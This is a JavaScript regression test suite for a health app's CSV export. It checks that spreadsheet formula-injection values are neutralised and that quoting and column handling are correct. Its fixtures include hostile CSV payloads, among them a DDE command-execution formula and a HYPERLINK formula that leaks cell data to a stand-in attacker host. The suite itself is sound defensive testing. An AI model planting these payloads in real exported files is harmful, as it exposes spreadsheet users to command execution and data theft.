/**
 * Regression suite for lib/csv.js and the CSV files written by
 * app/api/export-data/route.js.
 *
 * Guards the fix for the CSV formula-injection bug: the data export used to
 * write stored health values into `cycles.csv` / `daily_logs.csv` with a
 * hand-rolled writer that quoted fields but never neutralised the leading
 * characters (`=`, `+`, `-`, `@`, TAB, CR) that make a spreadsheet evaluate a
 * cell instead of displaying it.
 *
 *   node scripts/test-csv-export.js
 */

import {
  FIELD_SEPARATOR,
  ROW_SEPARATOR,
  collectColumns,
  escapeCsvValue,
  needsFormulaGuard,
  stringifyCsvValue,
  toCsv,
} from '../lib/csv.js'

let passed = 0
let failed = 0

function check(actual, expected, label) {
  if (Object.is(actual, expected)) {
    passed += 1
    return
  }
  failed += 1
  console.error(`  ❌ ${label}`)
  console.error(`       expected: ${JSON.stringify(expected)}`)
  console.error(`       actual:   ${JSON.stringify(actual)}`)
}

function checkTrue(actual, label) {
  check(actual, true, label)
}

function section(title) {
  console.log(`\n— ${title}`)
}

/**
 * Parses a CSV document back into rows of raw cell text, so assertions can be
 * written against what a spreadsheet actually reads rather than against the
 * exact byte layout of the file.
 */
function parseCsv(text) {
  const rows = []
  let row = []
  let field = ''
  let inQuotes = false

  for (let i = 0; i < text.length; i += 1) {
    const char = text[i]

    if (inQuotes) {
      if (char === '"') {
        if (text[i + 1] === '"') {
          field += '"'
          i += 1
        } else {
          inQuotes = false
        }
      } else {
        field += char
      }
      continue
    }

    if (char === '"') {
      inQuotes = true
    } else if (char === FIELD_SEPARATOR) {
      row.push(field)
      field = ''
    } else if (char === '\r' && text[i + 1] === '\n') {
      row.push(field)
      rows.push(row)
      row = []
      field = ''
      i += 1
    } else {
      field += char
    }
  }

  row.push(field)
  rows.push(row)
  return rows
}

// ───────────────────────────────────────────────────────────────────────────
section('formula triggers are detected')

check(needsFormulaGuard('=1+1'), true, '= is a trigger')
check(needsFormulaGuard('+1'), true, '+ is a trigger')
check(needsFormulaGuard('-1+1'), true, '- is a trigger')
check(needsFormulaGuard('@SUM(A1)'), true, '@ is a trigger')
check(needsFormulaGuard('\t=cmd'), true, 'leading TAB is a trigger')
check(needsFormulaGuard('\r=cmd'), true, 'leading CR is a trigger')

check(needsFormulaGuard('cramps'), false, 'plain text is not a trigger')
check(needsFormulaGuard(''), false, 'empty string is not a trigger')
check(needsFormulaGuard('a=b'), false, 'an = in the middle is not a trigger')
check(needsFormulaGuard(null), false, 'null is not a trigger')
check(needsFormulaGuard(42), false, 'a number is not a trigger')

// ───────────────────────────────────────────────────────────────────────────
section('injection payloads are neutralised')

const payloads = [
  '=1+1',
  '=HYPERLINK("https://example.com","click")',
  '+1234567890',
  '-1+1',
  '@SUM(1+1)',
  '\t=1+1',
  '=cmd|\' /C calc\'!A0',
]

for (const payload of payloads) {
  const escaped = escapeCsvValue(payload)
  checkTrue(escaped.startsWith('"\''), `payload is guarded and quoted: ${JSON.stringify(payload)}`)

  // Round-tripping through a parser must give back the original text with only
  // the guard character in front — no data is lost, it is just inert.
  const [[cell]] = parseCsv(escaped)
  check(cell, `'${payload}`, `payload survives a round-trip: ${JSON.stringify(payload)}`)
}

// A custom symptom name is stored inside the `symptoms` array, so the guard has
// to survive the array flattening rather than only applying to bare strings.
const [[arrayCell]] = parseCsv(escapeCsvValue(['=1+1', 'cramps']))
check(arrayCell, "'=1+1; cramps", 'a hostile first element of an array is guarded')

// ───────────────────────────────────────────────────────────────────────────
section('ordinary values are left alone')

check(escapeCsvValue('cramps'), 'cramps', 'plain text is not quoted')
check(escapeCsvValue(42), '42', 'a number stays numeric')
check(escapeCsvValue(-5), '-5', 'a negative number is not guarded')
check(escapeCsvValue(0), '0', 'zero is emitted, not dropped')
check(escapeCsvValue(true), 'true', 'a boolean is emitted')
check(escapeCsvValue(null), '', 'null becomes an empty cell')
check(escapeCsvValue(undefined), '', 'undefined becomes an empty cell')
check(escapeCsvValue(''), '', 'an empty string stays empty')
check(escapeCsvValue(Number.NaN), '', 'NaN becomes an empty cell')

// ───────────────────────────────────────────────────────────────────────────
section('RFC 4180 quoting')

check(escapeCsvValue('a,b'), '"a,b"', 'a comma forces quoting')
check(escapeCsvValue('say "hi"'), '"say ""hi"""', 'embedded quotes are doubled')
check(escapeCsvValue('line1\nline2'), '"line1\nline2"', 'a newline forces quoting')
check(escapeCsvValue(' padded '), '" padded "', 'surrounding whitespace is preserved by quoting')

const [[commaCell]] = parseCsv(escapeCsvValue('a,b'))
check(commaCell, 'a,b', 'a comma-bearing value round-trips as one cell')

const [[quoteCell]] = parseCsv(escapeCsvValue('say "hi"'))
check(quoteCell, 'say "hi"', 'a quote-bearing value round-trips intact')

// ───────────────────────────────────────────────────────────────────────────
section('value rendering')

check(stringifyCsvValue(['cramps', 'fatigue']), 'cramps; fatigue', 'arrays are joined')
check(stringifyCsvValue([]), '', 'an empty array is an empty cell')
check(
  stringifyCsvValue({ iv: 'abc', ciphertext: 'def' }),
  '{"iv":"abc","ciphertext":"def"}',
  'a jsonb column serialises to JSON, not [object Object]'
)
check(
  stringifyCsvValue(new Date(Date.UTC(2026, 6, 21, 9, 30))),
  '2026-07-21T09:30:00.000Z',
  'a Date serialises to ISO 8601'
)
check(stringifyCsvValue(new Date('nope')), '', 'an invalid Date becomes an empty cell')

const circular = { name: 'loop' }
circular.self = circular
check(stringifyCsvValue(circular), '[unserialisable]', 'a circular object is marked, not "[object Object]"')

// ───────────────────────────────────────────────────────────────────────────
section('column collection')

check(
  collectColumns([{ a: 1, b: 2 }, { a: 3, c: 4 }]).join(','),
  'a,b,c',
  'columns are the union across all rows, in first-seen order'
)
check(collectColumns([]).length, 0, 'no rows means no columns')
check(collectColumns(null).length, 0, 'a null row set is tolerated')
check(collectColumns([null, { a: 1 }]).join(','), 'a', 'null rows are skipped')

// ───────────────────────────────────────────────────────────────────────────
section('toCsv document shape')

check(toCsv([]), '', 'no rows produces an empty document')
check(toCsv(null), '', 'a null row set produces an empty document')

const simple = toCsv([{ date: '2026-07-21', mood: 'calm' }])
check(simple, `date,mood${ROW_SEPARATOR}2026-07-21,calm`, 'header and body are CRLF separated')

const widened = toCsv([{ a: 1 }, { a: 2, b: 3 }])
check(
  widened,
  `a,b${ROW_SEPARATOR}1,${ROW_SEPARATOR}2,3`,
  'a column that only appears on a later row is still exported'
)

const explicitOrder = toCsv([{ a: 1, b: 2 }], { columns: ['b', 'a'] })
check(explicitOrder, `b,a${ROW_SEPARATOR}2,1`, 'an explicit column order is honoured')

const headerless = toCsv([{ a: 1 }], { includeHeader: false })
check(headerless, '1', 'the header can be omitted')

const hostileHeader = toCsv([{ '=evil': 'x' }])
checkTrue(hostileHeader.startsWith('"\'=evil"'), 'the header row is escaped too')

// ───────────────────────────────────────────────────────────────────────────
section('end-to-end: a daily_logs export with a hostile note')

const dailyLogs = [
  {
    id: 'e6f1',
    user_id: 'user_123',
    date: '2026-07-21',
    symptoms: ['cramps', 'fatigue'],
    mood: '=HYPERLINK("https://attacker.example/?d="&A1,"Your results")',
    flow: 'medium',
    encrypted_data: { iv: 'aGVsbG8=', ciphertext: 'd29ybGQ=' },
    updated_at: null,
  },
  {
    id: 'a1b2',
    user_id: 'user_123',
    date: '2026-07-22',
    symptoms: [],
    mood: 'felt better, rested',
    flow: null,
    encrypted_data: null,
    updated_at: '2026-07-22T18:04:00.000Z',
  },
]

const csv = toCsv(dailyLogs)
const parsed = parseCsv(csv)

check(parsed.length, 3, 'header plus two data rows')
check(parsed[0].join('|'), 'id|user_id|date|symptoms|mood|flow|encrypted_data|updated_at', 'header names')

const moodIndex = parsed[0].indexOf('mood')
checkTrue(parsed[1][moodIndex].startsWith("'="), 'the hostile mood note is inert')
check(
  parsed[1][moodIndex],
  `'${dailyLogs[0].mood}`,
  'the hostile mood note still contains the full original text'
)

const symptomsIndex = parsed[0].indexOf('symptoms')
check(parsed[1][symptomsIndex], 'cramps; fatigue', 'the symptoms array is readable')
check(parsed[2][symptomsIndex], '', 'an empty symptoms array is an empty cell')

const encryptedIndex = parsed[0].indexOf('encrypted_data')
check(
  parsed[1][encryptedIndex],
  '{"iv":"aGVsbG8=","ciphertext":"d29ybGQ="}',
  'the encrypted payload is exported as JSON'
)
check(parsed[2][encryptedIndex], '', 'a null encrypted payload is an empty cell')

const moodWithComma = parsed[0].indexOf('mood')
check(parsed[2][moodWithComma], 'felt better, rested', 'a comma in a note does not shift the columns')
check(parsed[2].length, parsed[0].length, 'every row has exactly as many cells as the header')

// ───────────────────────────────────────────────────────────────────────────
if (failed > 0) {
  console.error(`\n❌ ${failed} assertion(s) failed, ${passed} passed.`)
  process.exit(1)
}

console.log(`\n✅ All ${passed} CSV export assertions passed.`)
